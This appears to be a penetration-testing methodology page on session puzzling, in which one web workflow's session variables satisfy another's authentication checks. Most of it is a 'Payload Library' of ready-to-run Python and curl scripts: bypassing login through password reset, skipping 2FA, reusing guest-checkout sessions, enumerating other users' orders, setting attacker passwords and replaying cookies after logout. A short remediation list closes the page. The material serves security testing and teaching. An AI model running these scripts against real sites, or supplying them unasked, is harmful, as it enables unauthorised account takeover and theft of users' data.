---
title: "Session Puzzling / Session Variable Overloading"
date: 2026-02-24
draft: false
---

# Session Puzzling / Session Variable Overloading

> **Severity**: High | **CWE**: CWE-384, CWE-613
> **OWASP**: A07:2021 – Identification and Authentication Failures

---

## What Is Session Puzzling?

Session Puzzling (also called Session Variable Overloading) is a vulnerability where the same session variable is used for different purposes in different application contexts, and an attacker can exploit this reuse to bypass authentication or authorization controls.

The core issue: when the same key in the session store holds different semantic meaning depending on which workflow put it there, an attacker can use one workflow to set a value that satisfies the check in another workflow.

```
Example:
  Password Reset flow:   session["user_id"] = USER_ID_REQUESTING_RESET
  Dashboard auth check:  if session["user_id"]: allow access

  Attack:
  1. Visit /forgot-password?email=admin@target.com
     → Server sets: session["user_id"] = ADMIN_USER_ID
  2. Visit /dashboard
     → Server checks: if session["user_id"] → True → access granted as admin
  → Authentication bypass without knowing any password
```

This is distinct from session fixation: the attacker doesn't need to control the victim's session — they exploit a logic flaw in their own session.

---

## Discovery Checklist

**Phase 1 — Enumerate Session-Setting Flows**
- [ ] Map every endpoint that writes to the session: login, password reset request, email verification, 2FA setup, OAuth callback, "remember device," checkout, API key generation
- [ ] Note exactly what each flow writes to session (requires source code, error messages, or inference from behavior)
- [ ] Identify session keys reused across multiple flows

**Phase 2 — Identify Privileged Session Checks**
- [ ] Map every endpoint that reads from session for auth/authz decisions
- [ ] Note the specific session key checked and what value it expects
- [ ] Identify if multiple flows set the same key with different semantics

**Phase 3 — Test Puzzling Chains**
- [ ] Password reset request → check auth-gated page
- [ ] Email verification initiation → check auth-gated page
- [ ] Partial multi-step auth (completed step 1 of 2FA) → access step-2-bypass pages
- [ ] OAuth partial flow → check if any session state carries privilege
- [ ] Shopping checkout flow → check if user_id set during checkout bypasses login requirement

---

## Payload Library

### Payload 1 — Password Reset to Dashboard Bypass

```python
#!/usr/bin/env python3
"""
Session Puzzling: Use password reset flow to set session["user_id"]
then directly access auth-gated pages
"""
import requests

TARGET = "https://target.com"
VICTIM_EMAIL = "admin@target.com"  # or any user you want to impersonate

s = requests.Session()

# Step 1: Initiate password reset for target user:
# This sets session["user_id"] = VICTIM_USER_ID without authentication
r = s.post(f"{TARGET}/forgot-password",
           data={"email": VICTIM_EMAIL},
           allow_redirects=False)

print(f"[*] Reset request: {r.status_code}")
print(f"[*] Session cookies: {dict(s.cookies)}")

# Step 2: Attempt to access auth-gated resources with the puzzled session:
endpoints = [
    "/dashboard",
    "/account/profile",
    "/account/settings",
    "/api/profile",
    "/api/user/me",
    "/admin",
    "/api/users",
]

for endpoint in endpoints:
    r = s.get(f"{TARGET}{endpoint}", allow_redirects=False)
    if r.status_code == 200:
        print(f"[!!!] ACCESS GRANTED: {endpoint} → {r.text[:200]}")
    elif r.status_code in (301, 302):
        loc = r.headers.get("Location", "")
        if "/login" not in loc:
            print(f"[???] REDIRECT to {loc} (may indicate partial access)")
    else:
        print(f"[ ] {endpoint}: {r.status_code}")
```

### Payload 2 — 2FA Step Confusion

```python
#!/usr/bin/env python3
"""
2FA step confusion:
After completing step 1 (password), session["2fa_user_id"] is set.
If some pages only check session["user_id"] and not 2FA completion flag,
they may be accessible after step 1 but before step 2.
"""
import requests

TARGET = "https://target.com"

s = requests.Session()

# Step 1: Enter correct username + password (but not 2FA yet):
r = s.post(f"{TARGET}/login",
           json={"username": "victim@target.com", "password": "CorrectPassword"},
           headers={"Content-Type": "application/json"})

print(f"[*] After password: {r.status_code} → {r.json()}")
print(f"[*] Expected: redirect to /login/2fa")

# Step 2: Without completing 2FA, try to access protected resources:
for endpoint in ["/dashboard", "/api/user/me", "/account/settings",
                 "/api/orders", "/api/admin/users"]:
    r = s.get(f"{TARGET}{endpoint}")
    if r.status_code == 200:
        print(f"[!!!] 2FA BYPASS: accessible at {endpoint}")
        print(f"      {r.text[:300]}")
    else:
        print(f"[ ] {endpoint}: {r.status_code}")

# Step 3: Test if accessing 2FA endpoint with another user's token
# while having completed step 1 for a different account:
# (Session confusion between 2fa_pending_user and verified_user)
r_2fa_complete = s.post(f"{TARGET}/login/2fa",
                         json={"code": "000000"},  # wrong code on purpose
                         allow_redirects=False)
print(f"\n[*] 2FA endpoint response with wrong code: {r_2fa_complete.status_code}")
```

### Payload 3 — Shopping Cart / Checkout User ID Reuse

```python
#!/usr/bin/env python3
"""
Some e-commerce apps set session["user_id"] during checkout for guest checkout
If auth check only validates session["user_id"] exists (not that user is logged in):
→ guest checkout flow → access authenticated endpoints
"""
import requests

TARGET = "https://target.com"

s = requests.Session()

# Initiate guest checkout (no login required):
r = s.post(f"{TARGET}/checkout/guest",
           json={"email": "attacker@evil.com",
                 "name": "Attacker",
                 "items": [{"id": "PROD1", "qty": 1}]},
           headers={"Content-Type": "application/json"})

print(f"[*] Guest checkout: {r.status_code}")
# If server sets session["user_id"] = GUEST_USER_ID or even an internal ID...

# Try accessing member-only endpoints:
for ep in ["/api/orders/history", "/api/profile", "/api/addresses",
           "/account", "/api/loyalty-points"]:
    resp = s.get(f"{TARGET}{ep}")
    if resp.status_code == 200:
        print(f"[!!!] Accessible via guest session: {ep}")
    else:
        print(f"[ ] {ep}: {resp.status_code}")

# Step 2: Can we access OTHER users' orders if user_id is guessable?
# If session["user_id"] can be set by guest checkout to any integer:
# (This would require additional manipulation — combined with mass assignment)
for uid in range(1, 100):
    s2 = requests.Session()
    s2.post(f"{TARGET}/checkout/guest",
            json={"email": f"test{uid}@evil.com", "userId": uid})
    r = s2.get(f"{TARGET}/api/orders")
    if r.status_code == 200:
        orders = r.json()
        if orders:
            print(f"[!!!] User {uid} has orders: {orders}")
```

### Payload 4 — Email Verification Session Pollution

```bash
# Email verification flow:
# POST /api/verify-email/request → sends verification email
# Server might store: session["verify_email"] = "victim@target.com"
# If verification check page reads session["email"] for display or logic:
# → attacker can set session["email"] = "admin@target.com" via verification request
# → then access page that trusts session["email"] as the authenticated email

# Test:
# 1. Request verification for admin@target.com:
curl -X POST "https://target.com/api/verify-email/request" \
  -H "Content-Type: application/json" \
  -c /tmp/sess.txt \
  -d '{"email":"admin@target.com"}'

# 2. Check if auth pages now show admin@target.com:
curl "https://target.com/api/profile" \
  -b /tmp/sess.txt

# 3. Try to update password for the "verified" email:
curl -X POST "https://target.com/api/account/set-password" \
  -H "Content-Type: application/json" \
  -b /tmp/sess.txt \
  -d '{"new_password":"AttackerPassword1!"}'

# Variant: OAuth linking session confusion:
# POST /oauth/link/google → sets session["oauth_link_user"] = X
# If some endpoint reads session["oauth_link_user"] as authenticated user...
curl -X POST "https://target.com/oauth/link/google" \
  -b /tmp/sess.txt \
  -d '{"code":"GOOGLE_AUTH_CODE"}'

curl "https://target.com/api/me" -b /tmp/sess.txt
```

### Payload 5 — Multi-Step Form Session Leakage

```python
#!/usr/bin/env python3
"""
Multi-step form stores sensitive data in session at intermediate steps.
If another user can read the session (shared session backend) or
if session is reused across requests, data may leak.

Test: wizard-style forms where each step stores data for next step.
"""
import requests

TARGET = "https://target.com"
s = requests.Session()

# Step 1 of registration wizard — fill personal info:
r = s.post(f"{TARGET}/register/step1",
           data={"first_name": "Test", "last_name": "User",
                 "email": "test@evil.com"})

# Step 2 — fill organization (skip if not needed):
r = s.post(f"{TARGET}/register/step2",
           data={"org_name": "Evil Corp", "role": "admin"})

# Step 3 — normally: set password → create account
# Instead: skip to step 3 directly with session from step 2 as different user:
# If session holds "pending_user_email" from step 1 for another user,
# and step 3 creates account using that email:
r = s.post(f"{TARGET}/register/step3",
           data={"password": "AttackerPassword1!",
                 "confirm_password": "AttackerPassword1!"})

print(f"[*] Step 3 result: {r.status_code} → {r.text[:300]}")
# If 201 Created with victim@target.com email → session puzzling to account takeover

# Test: use step 2 session to skip back to step 1 with different email:
# (State confusion — step 2 state remains but email changed)
r = s.post(f"{TARGET}/register/step1",
           data={"email": "admin@target.com"})  # change email mid-wizard
r = s.post(f"{TARGET}/register/step3",
           data={"password": "AttackerPwd1!"})
print(f"[*] Email swap result: {r.status_code} → {r.text[:300]}")
```

### Payload 6 — Session Riding After Logout

```python
#!/usr/bin/env python3
"""
Test if logout properly invalidates server-side session
(Related: zombie session reuse)
"""
import requests

TARGET = "https://target.com"

s = requests.Session()

# Login:
s.post(f"{TARGET}/api/login",
       json={"username": "user@target.com", "password": "Password1!"},
       headers={"Content-Type": "application/json"})

# Capture session cookie:
session_cookie = dict(s.cookies)
print(f"[*] Session before logout: {session_cookie}")

# Logout:
s.post(f"{TARGET}/api/logout")
print(f"[*] Logout complete")

# Create new session with OLD cookie:
s2 = requests.Session()
for name, value in session_cookie.items():
    s2.cookies.set(name, value, domain="target.com")

# Test if old session still works:
r = s2.get(f"{TARGET}/api/profile")
if r.status_code == 200 and "error" not in r.text.lower():
    print(f"[!!!] SESSION STILL VALID AFTER LOGOUT: {r.text[:200]}")
else:
    print(f"[ ] Session properly invalidated: {r.status_code}")

# Test: does logout invalidate only current session or all sessions?
# (Create two sessions, logout one, test the other)
s3 = requests.Session()
s3.post(f"{TARGET}/api/login",
        json={"username": "user@target.com", "password": "Password1!"})
sess3_cookie = dict(s3.cookies)

# Login again in s (second session) and logout:
s4 = requests.Session()
s4.post(f"{TARGET}/api/login",
        json={"username": "user@target.com", "password": "Password1!"})
s4.post(f"{TARGET}/api/logout")

# Is sess3 (different session, not logged out) still valid?
s5 = requests.Session()
for name, value in sess3_cookie.items():
    s5.cookies.set(name, value)
r = s5.get(f"{TARGET}/api/profile")
if r.status_code == 200:
    print(f"[*] Other session still valid after partial logout (may be by design)")
```

---

## Tools

```bash
# Burp Suite — primary tool for session puzzling discovery:
# 1. Map all session-writing endpoints via proxy history
# 2. Use Repeater to test specific puzzling chains
# 3. Use Logger++ extension to track session values across requests

# Session analysis with Python — extract and compare session data:
# If session is JWT: decode without verification to see claims
python3 << 'EOF'
import requests, base64, json

def decode_jwt(token):
    parts = token.split(".")
    if len(parts) == 3:
        padding = 4 - len(parts[1]) % 4
        payload = base64.urlsafe_b64decode(parts[1] + "=" * padding)
        return json.loads(payload)
    return None

# Test various flows and decode session state:
s = requests.Session()
flows = [
    ("password_reset", lambda: s.post("https://target.com/forgot-password",
                                       data={"email": "admin@target.com"})),
    ("guest_checkout", lambda: s.post("https://target.com/checkout/guest",
                                       json={"email": "t@t.com"})),
    ("oauth_init", lambda: s.get("https://target.com/oauth/google/start")),
]

for name, action in flows:
    s2 = requests.Session()
    action()
    for cookie in s2.cookies:
        if "session" in cookie.name.lower() or "token" in cookie.name.lower():
            decoded = decode_jwt(cookie.value)
            if decoded:
                print(f"[{name}] JWT claims: {decoded}")
            else:
                print(f"[{name}] Cookie {cookie.name}: {cookie.value[:40]}...")
EOF

# FFUF — enumerate multi-step form endpoints:
ffuf -u "https://target.com/register/FUZZ" \
  -w - << 'EOF'
step1
step2
step3
complete
confirm
verify
finish
EOF

# Check for session state in response bodies:
# Session puzzling often leaves session data in responses:
curl -s "https://target.com/dashboard" -b "session=SESSION_AFTER_RESET" | \
  python3 -c "
import sys, re
content = sys.stdin.read()
# Look for user identifiers, emails, roles in response:
for pattern in [r'user_id[\":\s]+(\w+)', r'email[\":\s]+([^\"<>\s]+)',
                r'role[\":\s]+([^\"<>\s]+)', r'admin[\":\s]+(true|false)']:
    matches = re.findall(pattern, content, re.IGNORECASE)
    if matches: print(f'{pattern}: {matches}')
"
```

---

## Remediation Reference

- **Semantic separation**: use distinct session keys for each workflow — `session["reset_pending_user_id"]` is different from `session["authenticated_user_id"]`; never reuse the same key for different security purposes
- **Authentication state flag**: maintain an explicit `session["authenticated"] = True` flag that is only set after full authentication — multi-step flows should use separate keys
- **2FA completion tracking**: use a dedicated flag like `session["mfa_complete"]` — only set after the second factor is verified; protect auth-gated resources by checking both `user_id` AND `mfa_complete`
- **Session clearing on flow completion**: clear intermediate session state when a workflow ends or is abandoned — don't let password reset state linger after the reset URL is used
- **Server-side session invalidation on logout**: invalidate the session server-side (remove from session store) on logout — cookie deletion alone is insufficient
- **Immutable session IDs for privileged operations**: consider requiring re-authentication (fresh session) for privileged operations rather than relying on long-lived session state
- **Code review**: audit every `session[key] = value` write across the codebase — map each key to all writers and all readers to identify semantic conflicts

*Part of the Web Application Penetration Testing Methodology series.*
